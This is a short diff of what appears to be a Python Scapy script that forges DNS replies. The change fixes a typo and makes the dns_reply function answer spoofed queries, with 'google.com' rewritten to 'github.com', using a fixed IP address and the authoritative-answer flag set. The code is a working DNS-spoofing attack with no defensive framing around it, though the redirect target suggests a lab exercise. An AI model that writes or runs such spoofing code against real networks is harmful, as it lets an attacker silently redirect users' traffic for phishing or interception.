@@ -14,11 +14,11 @@ except KeyboardInterrupt:
 
 
 def dns_reply(pkt):
-    spoofedn=kt[DNS].qd.qname.replace("google.com","github.com")
+    spoofedn=pkt[DNS].qd.qname.replace("google.com","github.com")
     spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
         DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
-        an=DNSRR(rrname="github.com", ttl=100, rdata='140.82.121.3')) 
+        an=DNSRR(rrname=spoofedn, ttl=100, rdata='140.82.121.3')) 
     send(spoofed_pkt)
 
 # def dns_crequest(pkt):
